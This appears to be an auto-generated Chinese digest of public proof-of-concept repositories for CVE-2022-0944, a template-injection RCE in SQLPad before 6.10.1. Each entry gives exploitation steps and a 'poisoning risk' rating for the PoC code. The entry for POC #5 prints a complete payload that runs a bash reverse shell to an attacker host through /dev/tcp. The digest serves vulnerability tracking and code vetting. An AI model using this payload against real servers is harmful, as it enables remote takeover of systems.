**项目地址:** [FlojBoj/CVE-2022-0944](https://github.com/FlojBoj/CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #5

**来源**: [CVE-2022-0944-LipeOzyy_SQLPad-RCE-Exploit-CVE-2022-0944.md](../2022/CVE-2022-0944-LipeOzyy_SQLPad-RCE-Exploit-CVE-2022-0944.md)

## CVE-2022-0944-sqlpad-RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致RCE

**影响应用:** sqlpad

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要具有连接测试的权限（高权限用户）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-0944 是 sqlpad 中存在的一个模板注入漏洞，位于连接测试端点。攻击者可以通过构造恶意的模板注入payload，在目标服务器上执行任意代码，从而获得服务器的控制权。

**有效性：**

根据漏洞库信息、搜索结果以及提供的漏洞利用代码，该漏洞利用是有效的。漏洞库信息明确指出存在模板注入导致RCE的漏洞，搜索结果也指向了相关漏洞细节和POC。提供的PHP代码通过向 `/api/test-connection` 发送包含恶意payload的JSON数据，从而触发远程代码执行。

**投毒风险：**

分析提供的`exploit.php`代码，未发现明显的恶意代码或后门。该脚本的功能主要是发送包含模板注入payload的HTTP请求，以触发目标服务器上的RCE。脚本的逻辑清晰，且直接使用了cURL库发送请求，没有发现任何尝试隐藏或执行其他恶意操作的代码。脚本只是一个exploit，不是后门。

**利用方式：**

1.  **漏洞点：** `/api/test-connection` 接口的 `database` 字段存在模板注入。
2.  **攻击步骤：**
    *   攻击者需要先监听一个端口（例如4444）。
    *   攻击者构造包含恶意代码的JSON数据，恶意代码通常是反弹shell的命令。
    *   攻击者将构造好的JSON数据发送到 `/api/test-connection` 接口。
    *   如果目标服务器存在漏洞，且模板引擎执行了攻击者的恶意代码，目标服务器会反弹shell到攻击者的监听端口。
3.  **Payload：**

    ```
    {{ process.mainModule.require('child_process').exec('/bin/bash -c "bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1"') }}
    ```

    该payload使用Node.js的 `child_process.exec` 函数执行系统命令，`/bin/bash -c` 执行一段bash脚本，该脚本的作用是创建一个反向shell连接到攻击者的IP地址和端口。

**总结：**

CVE-2022-0944 是一个高危漏洞，攻击者可以利用该漏洞远程执行任意代码。需要及时升级 sqlpad 到 6.10.1 或更高版本。

**项目地址:** [LipeOzyy/SQLPad-RCE-Exploit-CVE-2022-0944](https://github.com/LipeOzyy/SQLPad-RCE-Exploit-CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #6

**来源**: [CVE-2022-0944-Philip-Otter_CVE-2022-0944_RCE_Automation.md](../2022/CVE-2022-0944-Philip-Otter_CVE-2022-0944_RCE_Automation.md)

## CVE-2022-0944-sqlpad-TemplateInjection-RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入

**影响应用:** sqlpad

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要目标sqlpad实例的网络访问，以及具有创建连接权限的高权限用户。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-0944是sqlpad中存在的一个模板注入漏洞，存在于连接测试端点。攻击者可以通过构造恶意的模板注入payload，在目标服务器上执行任意代码，从而完全控制服务器。 

**漏洞利用方式：**

1.  **身份验证：** 首先，攻击者需要拥有 sqlpad 实例中具有创建连接权限的用户身份，一般是管理员权限。
2.  **构造Payload：** 攻击者构造包含恶意代码的模板注入Payload。该Payload利用了Node.js的`child_process.exec`函数来执行系统命令。从提供的漏洞利用代码中可以看到，payload的形式为`{{ process.mainModule.require('child_process').exec('COMMAND') }}`，其中COMMAND是要执行的命令。
3.  **发送请求：**  攻击者通过POST请求将包含Payload的JSON数据发送到`/api/connections`端点，创建一个新的数据库连接配置。关键在于`data.database`字段，该字段会被模板引擎解析，导致代码执行。
4.  **触发漏洞：**  创建连接后，攻击者通过GET请求访问`/api/connections/{id}/schema`端点，触发连接测试，从而执行Payload。
5.  **反弹shell (可选)：**  为了方便利用，攻击者通常使用Payload执行反弹shell命令，从而获得对目标服务器的控制权。
6.  **利用代码分析:**
    * `exploit.py`是一个Python脚本，实现了CVE-2022-0944漏洞的自动化利用。
    * 脚本接受目标URL、攻击者IP等参数。
    * 脚本首先创建一个随机字符串，作为连接名称。
    * 脚本构造包含恶意代码的JSON数据，并将其发送到`/api/connections`端点。
    * 脚本通过GET请求访问`/api/connections/{id}/schema`端点，触发漏洞，从而执行Payload。
    * 脚本可以监听指定端口，接收命令执行结果（通过base64编码）。

**投毒风险评估：**

该代码主要实现了漏洞利用功能，但仍存在一定的投毒风险，评估为10%。理由如下：

*   **潜在的恶意命令注入：** 攻击者可以通过`-c`参数指定要执行的命令。如果脚本没有对该参数进行充分的验证和过滤，攻击者可能会注入恶意命令，例如下载和执行额外的恶意程序。
*   **后门植入：** 攻击者可能修改脚本，在成功利用漏洞后，在目标服务器上植入后门，以便长期控制目标系统。
*   **信息收集：** 脚本可以收集目标服务器的信息，例如操作系统版本、已安装的软件等。这些信息可能会被泄露给攻击者，用于进一步的攻击。

因此，在使用该脚本时，需要仔细检查代码，确保没有恶意代码被注入，并采取必要的安全措施，例如限制脚本的执行权限、监控脚本的网络活动等。

**项目地址:** [Philip-Otter/CVE-2022-0944_RCE_Automation](https://github.com/Philip-Otter/CVE-2022-0944_RCE_Automation)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #7

**来源**: [CVE-2022-0944-Robocopsita_CVE-2022-0944_RCE_POC.md](../2022/CVE-2022-0944-Robocopsita_CVE-2022-0944_RCE_POC.md)

## CVE-2022-0944-SQLPad-模板注入导致RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致RCE

**影响应用:** SQLPad

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户才能利用

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-0944是SQLPad版本低于6.10.1中存在的一个模板注入漏洞。该漏洞位于connection test endpoint。攻击者可以利用该漏洞在服务器上执行任意代码。根据漏洞描述和提供的POC代码，利用方式如下：

1.  **漏洞原理：** SQLPad在测试数据库连接时，没有充分过滤用户提供的数据库配置信息，导致攻击者可以在数据库配置（例如数据库名称）中使用模板引擎的语法。
2.  **攻击步骤：**
    *   攻击者需要具有高权限才能访问connection test endpoint。
    *   攻击者构造包含恶意代码的payload。该payload利用`process.mainModule.require('child_process').exec()`来执行系统命令。POC中使用反向shell作为例子。
    *   攻击者将构造好的payload插入到数据库连接配置的`database`字段中，并发送到`/api/test-connection`接口。
    *   服务器在测试连接时，会解析payload中的模板代码，从而执行攻击者指定的系统命令，实现远程代码执行。
3.  **POC有效性：** 提供的POC代码利用python脚本自动化了上述攻击过程，通过发送精心构造的POST请求，可以触发漏洞并获得反向shell。根据代码逻辑和漏洞描述，该POC代码是有效的。
4.  **投毒风险：** 代码的`README.md`中声明仅用于教育目的，并免责。代码本身主要功能是发送包含恶意payload的HTTP请求，并在本地监听端口接收反向shell。虽然代码主要功能是漏洞利用，但仍然存在一些潜在的投毒风险：
    *   **Netcat依赖：** POC依赖于系统安装`netcat`，如果目标系统没有`netcat`，漏洞利用会失败。但是，如果攻击者修改了脚本，将反向shell的方式修改为使用python或其他目标系统更可能存在的工具，可能会增加攻击成功率。
    *   **隐蔽后门：** 理论上，脚本可以被修改为在受害者机器上安装持久性后门，例如添加计划任务或者修改启动脚本，但当前的脚本未发现此类行为。
    *   **依赖风险：** 脚本依赖于`requests`库。如果攻击者修改了`requirements.txt`文件，添加恶意的依赖包，可能导致用户安装恶意库。
    *   **安全声明免责：**虽然声明了免责条款，但是仍要小心使用，务必在授权的渗透测试场景中使用。
    *   综合评估，由于POC的主要功能是RCE利用，且代码相对简单，隐藏恶意代码的难度较高。因此投毒风险较低，估计在5%左右。

**项目地址:** [Robocopsita/CVE-2022-0944_RCE_POC](https://github.com/Robocopsita/CVE-2022-0944_RCE_POC)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #8

**来源**: [CVE-2022-0944-shhrew_CVE-2022-0944.md](../2022/CVE-2022-0944-shhrew_CVE-2022-0944.md)

## CVE-2022-0944 - SQLPad 模板注入导致RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入

**影响应用:** SQLPad

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户访问，目标存在 /api/test-connection 接口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-0944 漏洞是 SQLPad 6.10.1 之前版本中存在的一个模板注入漏洞。该漏洞位于 `/api/test-connection` 接口，攻击者可以通过构造恶意的模板注入payload，执行任意代码。根据漏洞库信息，该漏洞的CVSS 3.0评分为9.1，属于严重级别。搜索引擎结果显示，已经存在公开的漏洞利用代码。

**有效性：**

根据提供的漏洞利用代码，该PoC使用 Python 编写，通过向 `/api/test-connection` 发送包含恶意payload的请求来触发漏洞。Payload 使用 `process.mainModule.require('child_process').exec()` 执行系统命令。代码中还包含一个反弹shell的功能，方便攻击者进行利用。该POC代码看起来是有效的，因为漏洞信息和代码逻辑是符合的.

**投毒风险：**

查看了提供的PoC代码，包含`LICENSE`，`README.md` 和 `main.py` 文件，没有发现明显的恶意代码或者后门，只是实现了漏洞的利用。代码功能比较直观，主要是发送恶意请求并监听端口获取反弹shell。因此，投毒风险评估为0%。

**利用方式：**

1.  **身份验证（可选）：** 如果目标SQLPad实例启用了身份验证，攻击者需要提供有效的用户名和密码才能利用该漏洞。PoC代码提供了身份验证功能。
2.  **发送恶意请求：** 攻击者构造一个包含恶意payload的JSON数据，并将其发送到 `/api/test-connection` 接口。Payload中利用了模板注入的特性，执行任意系统命令，启动反弹shell.
3.  **监听反弹Shell：** 攻击者在本地设置一个监听器，等待目标服务器连接，从而获得对目标服务器的控制权。

总而言之，该漏洞的利用方式简单直接，只需要发送一个精心构造的请求即可实现远程代码执行，风险极高。在sqlpad 6.10.1之前的版本应该升级。

**项目地址:** [shhrew/CVE-2022-0944](https://github.com/shhrew/CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #9

**来源**: [CVE-2022-0944-toneillcodes_CVE-2022-0944.md](../2022/CVE-2022-0944-toneillcodes_CVE-2022-0944.md)

## CVE-2022-0944-sqlpad-RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致远程代码执行

**影响应用:** sqlpad

**危害等级:** 高危，可导致完全控制服务器

**影响版本:** < 6.10.1

**利用条件:** 需要目标实例存在/api/test-connection接口, 需要较高权限才能访问该接口

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-0944是SQLPad 6.10.1之前版本中存在的一个模板注入漏洞。攻击者可以通过向`/api/test-connection`端点发送特制的请求，在服务器上执行任意代码，从而完全控制服务器。根据漏洞库信息和搜索结果，该漏洞危害巨大，易于利用。漏洞利用代码中的Python脚本通过构造包含恶意payload的JSON数据，并将其发送到目标服务器的`/api/test-connection`端点，从而触发远程代码执行。Payload使用 `child_process.exec` 函数来执行操作系统命令，并建立反向shell连接到攻击者的机器。 检查漏洞利用代码，没有发现明显的投毒迹象。Payload部分是标准的反向shell，没有其他恶意行为。因此，投毒风险较低。

**利用方式：**
1.  攻击者需要访问SQLPad实例的`/api/test-connection`接口。
2.  攻击者构造一个包含恶意模板注入payload的JSON请求。Payload使用JavaScript代码调用`child_process.exec`函数来执行任意命令。
3.  攻击者将构造的JSON请求发送到`/api/test-connection`端点。
4.  SQLPad服务器处理该请求时，模板引擎会解析恶意payload，导致执行攻击者指定的命令。
5.  攻击者可以在服务器上执行任意代码，例如创建反向shell连接，从而完全控制服务器。

**项目地址:** [toneillcodes/CVE-2022-0944](https://github.com/toneillcodes/CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

